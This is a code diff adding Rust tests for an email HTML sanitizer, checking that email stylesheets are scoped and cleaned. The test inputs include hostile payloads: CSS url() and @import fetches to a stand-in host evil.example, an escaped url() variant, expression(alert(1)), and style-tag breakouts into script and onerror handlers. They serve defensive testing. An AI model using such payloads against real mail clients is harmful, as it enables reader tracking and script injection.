@@ -143,3 +143,49 @@ fn text_to_html_escapes_and_links() {
     // Output of text_to_html survives the sanitizer unchanged in substance.
     assert!(clean(&out).contains("href=\"https://example.com/x?a=1&amp;b=2\""));
 }
+
+#[test]
+fn an_emails_stylesheet_is_kept_cleaned_and_scoped_to_it() {
+    let out = clean(
+        r#"<style>.title{color:#222;font-size:28px;background:url(https://evil.example/t.gif);position:fixed}
+           @media only screen and (max-width:600px){.title{font-size:20px}}
+           @font-face{font-family:x;src:url(https://evil.example/f.woff)}
+           p > a{text-decoration:none}</style><h1 class="title main">Hi</h1>"#,
+    );
+    assert!(out.starts_with("<style>@scope{"), "kept to the message: {out}");
+    assert!(out.contains(".e-title{color:#222;font-size:28px}"), "{out}");
+    assert!(out.contains("@media only screen and (max-width:600px){.e-title{font-size:20px}}"), "{out}");
+    assert!(out.contains("p > a{text-decoration:none}"), "{out}");
+    assert!(out.contains(r#"class="e-title e-main""#), "{out}");
+    for gone in ["evil.example", "url(", "@font-face", "position", "background"] {
+        assert!(!out.contains(gone), "{gone} survived in {out}");
+    }
+}
+
+#[test]
+fn a_stylesheet_cannot_fetch_escape_or_break_out() {
+    assert_absent(
+        r#"<style>@import url(https://evil.example/x.css);p{color:red}</style><p>x</p>"#,
+        &["@import", "evil.example"],
+    );
+    assert_absent(r#"<style>p{color:red;width:u\72l(https://evil.example/x)}</style><p>x</p>"#, &["evil", "\\"]);
+    assert_absent(r#"<style>p{width:expression(alert(1))}</style><p>x</p>"#, &["expression", "alert"]);
+    assert_absent(
+        r#"<style>p{font-family:"</style><script>alert(1)</script>"}</style><p>x</p>"#,
+        &["<script", "alert"],
+    );
+    assert_absent(r#"<style>p{color:red}/* </style><img src=x onerror=alert(1)> */</style>"#, &["onerror", "alert"]);
+    assert_absent(r#"<style>a[href^="http"]{background-image:url(https://evil.example/leak)}</style>"#, &["evil"]);
+    // A selector that would reach outside the message has nothing to match:
+    // the sheet is scoped; and an unbalanced block is dropped whole.
+    let out = clean(r#"<style>p{color:red</style><p>x</p>"#);
+    assert!(!out.contains("<style"), "{out}");
+    // Classes are prefixed: the reader's own (.body, .msg) cannot be named.
+    assert!(clean(r#"<div class="body msg">x</div>"#).contains(r#"class="e-body e-msg""#));
+}
+
+#[test]
+fn a_kept_stylesheet_is_not_text() {
+    let text = mail_mime::html_to_text(&clean("<style>p{color:red}</style><p>Hello there</p>"));
+    assert_eq!(text.trim(), "Hello there");
+}
